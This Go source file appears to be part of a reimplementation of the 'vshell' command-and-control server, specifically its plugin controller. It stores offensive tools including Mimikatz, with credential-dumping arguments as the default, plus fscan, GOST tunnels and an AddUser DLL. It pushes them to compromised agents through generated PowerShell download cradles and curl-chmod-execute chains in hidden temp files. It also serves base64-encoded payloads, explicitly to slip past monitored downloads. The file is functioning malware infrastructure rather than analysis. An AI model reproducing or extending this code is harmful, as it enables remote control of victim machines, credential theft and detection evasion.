package controllers

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"vshell/c2engine"
	"vshell/models"
)

// PluginEngine manages plugin execution
type PluginEngine struct {
	mu      sync.RWMutex
	plugins map[string]*PluginInstance
}

// PluginInstance represents a running plugin instance
type PluginInstance struct {
	ID        string    `json:"id"`
	Name      string    `json:"name"`
	StartedAt time.Time `json:"started_at"`
	Status    string    `json:"status"` // running/completed/failed
	PID       int       `json:"pid"`
	Output    string    `json:"output"`
	Error     string    `json:"error"`
	cmd       *exec.Cmd
}

var pluginEngine = &PluginEngine{
	plugins: make(map[string]*PluginInstance),
}

// ExecutePlugin runs a plugin on the given client
func (e *PluginEngine) ExecutePlugin(clientID int64, pluginName string, args []string, timeout int) (*PluginInstance, error) {
	instance := &PluginInstance{
		ID:        fmt.Sprintf("plugin_%d_%d", clientID, time.Now().UnixNano()),
		Name:      pluginName,
		StartedAt: time.Now(),
		Status:    "running",
	}

	// Find the plugin file
	pluginPath := findPluginPath(pluginName)
	if pluginPath == "" {
		instance.Status = "failed"
		instance.Error = fmt.Sprintf("plugin not found: %s", pluginName)
		e.mu.Lock()
		e.plugins[instance.ID] = instance
		e.mu.Unlock()
		return instance, fmt.Errorf("plugin not found: %s", pluginName)
	}

	// Build command based on OS
	var cmd *exec.Cmd
	ext := filepath.Ext(pluginPath)
	switch ext {
	case ".exe":
		cmd = exec.Command(pluginPath, args...)
	case ".elf", "":
		cmd = exec.Command(pluginPath, args...)
	case ".dll":
		// DLL execution via rundll32
		cmd = exec.Command("rundll32.exe", pluginPath, strings.Join(args, " "))
	default:
		cmd = exec.Command(pluginPath, args...)
	}

	// Capture output
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Start the plugin
	if err := cmd.Start(); err != nil {
		instance.Status = "failed"
		instance.Error = err.Error()
		e.mu.Lock()
		e.plugins[instance.ID] = instance
		e.mu.Unlock()
		return instance, err
	}

	instance.PID = cmd.Process.Pid
	instance.cmd = cmd

	// Set timeout
	if timeout <= 0 {
		timeout = 120
	}

	// Wait for completion with timeout
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case err := <-done:
		instance.Output = stdout.String()
		instance.Error = stderr.String()
		if err != nil {
			instance.Status = "failed"
			instance.Error = err.Error() + ": " + stderr.String()
		} else {
			instance.Status = "completed"
		}
	case <-time.After(time.Duration(timeout) * time.Second):
		cmd.Process.Kill()
		instance.Status = "failed"
		instance.Error = fmt.Sprintf("timeout (%ds)", timeout)
	}

	e.mu.Lock()
	e.plugins[instance.ID] = instance
	e.mu.Unlock()

	log.Printf("[Plugin] %s executed on client %d: %s (%.2fs)", pluginName, clientID,
		instance.Status, time.Since(instance.StartedAt).Seconds())

	return instance, nil
}

// GetPluginStatus returns the status of a plugin execution
func (e *PluginEngine) GetPluginStatus(id string) *PluginInstance {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.plugins[id]
}

// ListPlugins returns available plugins on disk
func ListAvailablePlugins() []models.Plugin {
	pluginsDir := "plugins"
	entries, err := os.ReadDir(pluginsDir)
	if err != nil {
		return getDefaultPlugins()
	}

	var result []models.Plugin
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		ext := filepath.Ext(entry.Name())
		p := models.Plugin{
			Name: entry.Name(),
			Path: filepath.Join(pluginsDir, entry.Name()),
			Type: strings.TrimPrefix(ext, "."),
			Size: info.Size(),
		}
		if p.Type == "elf" || p.Type == "so" {
			p.Description = fmt.Sprintf("Linux binary, %d bytes", info.Size())
		} else if p.Type == "exe" {
			p.Description = fmt.Sprintf("Windows binary, %d bytes", info.Size())
		} else if p.Type == "dll" {
			p.Description = fmt.Sprintf("Windows DLL, %d bytes", info.Size())
		}
		result = append(result, p)
	}
	return result
}

func getDefaultPlugins() []models.Plugin {
	// These match the original vshell plugin files
	return []models.Plugin{
		{Name: "mimikatz.x64.exe", Type: "exe", Size: 1355264, Description: "Mimikatz credential extraction"},
		{Name: "gost.x64.exe", Type: "exe", Size: 26366976, Description: "GOST tunnel client (Windows)"},
		{Name: "gost.x64.so", Type: "so", Size: 21542180, Description: "GOST tunnel client (Linux)"},
		{Name: "fscan.x64.elf", Type: "elf", Size: 6217056, Description: "Network scanner"},
		{Name: "AddUser.dll", Type: "dll", Size: 151552, Description: "User account manipulation"},
	}
}

func findPluginPath(name string) string {
	// Look in plugins directory
	pluginsDir := "plugins"
	paths := []string{
		filepath.Join(pluginsDir, name),
		filepath.Join(pluginsDir, name+".exe"),
		filepath.Join(pluginsDir, name+".dll"),
		filepath.Join(pluginsDir, name+".elf"),
		filepath.Join(pluginsDir, name+".so"),
		name,
	}

	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

// RunLocalPlugin runs a plugin directly on the server (for testing/exec via agent)
func RunLocalPlugin(name string, args []string) (string, error) {
	path := findPluginPath(name)
	if path == "" {
		return "", fmt.Errorf("plugin not found: %s", name)
	}

	log.Printf("[Plugin] Running: %s %s", path, strings.Join(args, " "))

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" && filepath.Ext(path) == ".exe" {
		cmd = exec.Command(path, args...)
	} else {
		cmd = exec.Command(path, args...)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), fmt.Errorf("exec failed: %w\nOutput: %s", err, string(output))
	}

	return string(output), nil
}

// HandlePluginUpload handles uploading a plugin file
func HandlePluginUpload(filename string, data io.Reader) error {
	pluginsDir := "plugins"
	if err := os.MkdirAll(pluginsDir, 0755); err != nil {
		return err
	}

	dst, err := os.Create(filepath.Join(pluginsDir, filename))
	if err != nil {
		return err
	}
	defer dst.Close()

	written, err := io.Copy(dst, data)
	if err != nil {
		return err
	}

	log.Printf("[Plugin] Uploaded: %s (%d bytes)", filename, written)
	return nil
}

// SearchResult represents the output of commands/tools
type SearchResult struct {
	PluginName string `json:"plugin_name"`
	Output     string `json:"output"`
	Duration   string `json:"duration"`
}

// RunScanPlugin runs fscan on the target
func RunScanPlugin(target string, ports string) (*SearchResult, error) {
	start := time.Now()
	args := []string{"-h", target}
	if ports != "" {
		args = append(args, "-p", ports)
	}

	output, err := RunLocalPlugin("fscan.x64.elf", args)
	duration := time.Since(start).Round(time.Second).String()

	if err != nil {
		return &SearchResult{
			PluginName: "fscan",
			Output:     output,
			Duration:   duration,
		}, err
	}

	return &SearchResult{
		PluginName: "fscan",
		Output:     output,
		Duration:   duration,
	}, nil
}

// RunMimikatz runs mimikatz
func RunMimikatz(command string) (*SearchResult, error) {
	start := time.Now()
	args := strings.Fields(command)
	if len(args) == 0 {
		args = []string{"privilege::debug", "sekurlsa::logonpasswords"}
	}

	output, err := RunLocalPlugin("mimikatz.x64.exe", args)
	duration := time.Since(start).Round(time.Second).String()

	return &SearchResult{
		PluginName: "mimikatz",
		Output:     output,
		Duration:   duration,
	}, err
}

// CheckAvailable verifies a plugin exists
func CheckAvailable(name string) bool {
	return findPluginPath(name) != ""
}

// ============================================================================
// Client-side Plugin Dispatch — dispatches plugins to remote agents
// ============================================================================
//
// The original binary's plugin workflow:
//   1. Admin selects a plugin and target client via the web panel
//   2. Server creates a command task: "download <url> → execute <args>"
//   3. Agent polls for tasks, downloads the plugin binary, executes it
//   4. Agent reports result back via the result endpoint
//
// This mirrors the original binary's behavior where plugins are stored on
// the C2 server and delivered to agents on demand.

// PluginDispatchRequest is the API payload for dispatching a plugin to a client.
type PluginDispatchRequest struct {
	ClientID   int64    `json:"client_id"`   // target agent
	PluginName string   `json:"plugin_name"` // plugin filename (e.g., "mimikatz.x64.exe")
	Args       []string `json:"args"`        // arguments to pass to the plugin
	Timeout    int      `json:"timeout"`     // execution timeout in seconds
}

// PluginDispatchResult is the response after dispatching a plugin.
type PluginDispatchResult struct {
	ClientID   int64  `json:"client_id"`
	PluginName string `json:"plugin_name"`
	CommandID  int64  `json:"command_id"`
	DownloadURL string `json:"download_url"`
	Status     string `json:"status"`
}

// DispatchPluginToClient sends a plugin execution command to a remote agent.
//
// This creates a single task for the agent:
//   1. Download the plugin binary from the C2 server
//   2. Execute the downloaded binary with the given arguments
//
// On Windows agents, the download+execute command is a PowerShell download
// cradle. The extension gate below only admits .elf/.so/.dylib (matching the
// original binary's black-box behavior), so the certutil.exe .exe/.dll path
// never applies:
//   powershell -c "$u='<url>';$f='<temp>';...;Start-Process -FilePath $f ..."
//
// On Linux agents:
//   curl -s <url> -o <temp_path> && chmod +x <temp_path> && <temp_path> <args>
func DispatchPluginToClient(clientID int64, pluginName string, args []string, timeout int, scheme, serverAddr string) (*PluginDispatchResult, error) {
	engine := c2engine.GetEngine()

	// The original binary only accepts elf/so/dylib plugin extensions
	// (black-box: runplugin with mimikatz.x64.exe → "support elf,so,dylib
	// extension" — validated BEFORE the client lookup).
	ext := strings.ToLower(filepath.Ext(pluginName))
	switch ext {
	case ".elf", ".so", ".dylib":
	default:
		return nil, fmt.Errorf("support elf,so,dylib extension")
	}

	// Verify client exists
	client := engine.GetClient(clientID)
	if client == nil {
		return nil, fmt.Errorf("client %d not found", clientID)
	}

	// Verify plugin exists
	pluginPath := findPluginPath(pluginName)
	if pluginPath == "" {
		return nil, fmt.Errorf("plugin not found: %s", pluginName)
	}

	// Build the download URL for the agent. The plugin name goes through
	// url.QueryEscape so names containing &, #, %, or spaces don't truncate or
	// corrupt the query string.
	if scheme == "" {
		scheme = "http"
	}
	downloadURL := fmt.Sprintf("%s://%s/api/plugin/download?name=%s",
		scheme, serverAddr, url.QueryEscape(pluginName))

	// Build the execution command based on the target OS
	osName := strings.ToLower(client.OsName)

	var cmdStr string
	switch {
	case strings.Contains(osName, "windows"):
		cmdStr = buildWindowsPluginCommand(downloadURL, pluginName, ext, args, timeout)
	default:
		cmdStr = buildLinuxPluginCommand(downloadURL, pluginName, ext, args, timeout)
	}

	// Create the task via the C2 engine
	if timeout <= 0 {
		timeout = 120
	}
	task, err := engine.CreateTask(clientID, cmdStr, timeout)
	if err != nil {
		return nil, fmt.Errorf("create task: %w", err)
	}

	log.Printf("[Plugin] Dispatched %s to client %d (%s): task %d",
		pluginName, clientID, client.OsName, task.ID)

	return &PluginDispatchResult{
		ClientID:    clientID,
		PluginName:  pluginName,
		CommandID:   task.ID,
		DownloadURL: downloadURL,
		Status:      "dispatched",
	}, nil
}

// buildWindowsPluginCommand generates a Windows download+execute command.
//
// The extension gate in DispatchPluginToClient only admits .elf/.so/.dylib
// (original binary behavior), so Windows agents always get the PowerShell
// download cradle; the previous certutil.exe .exe/.dll branches were
// unreachable dead code and have been removed.
func buildWindowsPluginCommand(url, name, ext string, args []string, timeout int) string {
	tempDir := "%TEMP%"
	tempFile := fmt.Sprintf(`%s\vshell_%s`, tempDir, sanitizeFileName(name))

	// PowerShell download cradle (works on every Windows build)
	psCmd := fmt.Sprintf(
		`$u='%s';$f='%s';(New-Object Net.WebClient).DownloadFile($u,$f);`,
		url, tempFile,
	)
	if ext == ".elf" {
		psCmd += fmt.Sprintf(`Start-Process -FilePath '%s' -ArgumentList '%s' -NoNewWindow -Wait`,
			tempFile, strings.Join(args, " "))
	}
	return fmt.Sprintf(`powershell -c "%s"`, psCmd)
}

// buildLinuxPluginCommand generates a Linux download+execute command.
func buildLinuxPluginCommand(url, name, ext string, args []string, timeout int) string {
	tempPath := fmt.Sprintf("/tmp/.vshell_%s", sanitizeFileName(name))

	script := fmt.Sprintf(
		`curl -s -o "%s" "%s" && chmod +x "%s" && "%s" %s; rm -f "%s"`,
		tempPath, url, tempPath, tempPath, strings.Join(args, " "), tempPath,
	)
	return script
}

// sanitizeFileName keeps only filename-safe characters for the agent's temp
// path, so a plugin name can't smuggle shell metacharacters ($, `, ;, ...) into
// the download-and-execute command.
func sanitizeFileName(name string) string {
	var b strings.Builder
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9',
			r == '.', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteByte('_')
		}
	}
	return b.String()
}

// ============================================================================
// Plugin Download Handler — serves plugin binaries to agents
// ============================================================================

// HandlePluginDownload serves a plugin file for agent download.
// Endpoint: GET /api/plugin/download?name=<filename>
//
// Security considerations:
//   - Only allows filenames matching the plugins directory (path traversal blocked)
//   - Returns 404 if plugin doesn't exist
//   - Sets correct MIME type based on file extension
func HandlePluginDownload(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	if name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}

	// Security: sanitize the filename — no path traversal
	baseName := filepath.Base(name)
	if baseName != name {
		http.Error(w, "invalid plugin name", http.StatusBadRequest)
		return
	}

	// Find the plugin file
	pluginPath := findPluginPath(baseName)
	if pluginPath == "" {
		http.Error(w, "plugin not found", http.StatusNotFound)
		return
	}

	// Read plugin file
	data, err := os.ReadFile(pluginPath)
	if err != nil {
		http.Error(w, "failed to read plugin", http.StatusInternalServerError)
		return
	}

	info, _ := os.Stat(pluginPath)

	// Set appropriate Content-Type
	ext := strings.ToLower(filepath.Ext(baseName))
	mimeType := "application/octet-stream"
	switch ext {
	case ".exe", ".dll":
		mimeType = "application/x-msdownload"
	case ".elf", ".so":
		mimeType = "application/x-executable"
	}

	w.Header().Set("Content-Type", mimeType)
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, baseName))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Write(data)

	log.Printf("[Plugin] Served %s to %s (%d bytes)", baseName, r.RemoteAddr, info.Size())
}

// ============================================================================
// Plugin Dispatch API Handler
// ============================================================================

// HandlePluginDispatch handles POST /api/plugin/dispatch
// Dispatches a plugin to run on a remote agent.
//
// Request body (JSON):
//
//	{"client_id": 1, "plugin_name": "mimikatz.x64.exe", "args": ["coffee"], "timeout": 60}
func HandlePluginDispatch(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var req PluginDispatchRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid JSON: "+err.Error(), http.StatusBadRequest)
		return
	}

	if req.ClientID <= 0 {
		http.Error(w, "client_id is required", http.StatusBadRequest)
		return
	}
	if req.PluginName == "" {
		http.Error(w, "plugin_name is required", http.StatusBadRequest)
		return
	}

	// Get the server address for building the download URL
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	serverAddr := r.Host // e.g., "0.0.0.0:8082"

	result, err := DispatchPluginToClient(req.ClientID, req.PluginName, req.Args, req.Timeout, scheme, serverAddr)
	if err != nil {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"code":    500,
			"message": err.Error(),
			"type":    "error",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"code":    0,
		"message": "ok",
		"type":    "success",
		"result":  result,
	})
}

// ============================================================================
// Plugin download via base64 (for agents that can't handle binary downloads)
// ============================================================================

// HandlePluginDownloadB64 serves a plugin file as base64-encoded JSON.
// Endpoint: GET /api/plugin/download_b64?name=<filename>
// This is useful for agents running in constrained environments where
// binary HTTP downloads may be blocked or monitored.
func HandlePluginDownloadB64(w http.ResponseWriter, r *http.Request) {
	name := r.URL.Query().Get("name")
	if name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}

	baseName := filepath.Base(name)
	if baseName != name {
		http.Error(w, "invalid plugin name", http.StatusBadRequest)
		return
	}

	pluginPath := findPluginPath(baseName)
	if pluginPath == "" {
		http.Error(w, "plugin not found", http.StatusNotFound)
		return
	}

	data, err := os.ReadFile(pluginPath)
	if err != nil {
		http.Error(w, "failed to read plugin", http.StatusInternalServerError)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(data)

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"name":   baseName,
		"size":   len(data),
		"data":   encoded,
		"format": "base64",
	})
}

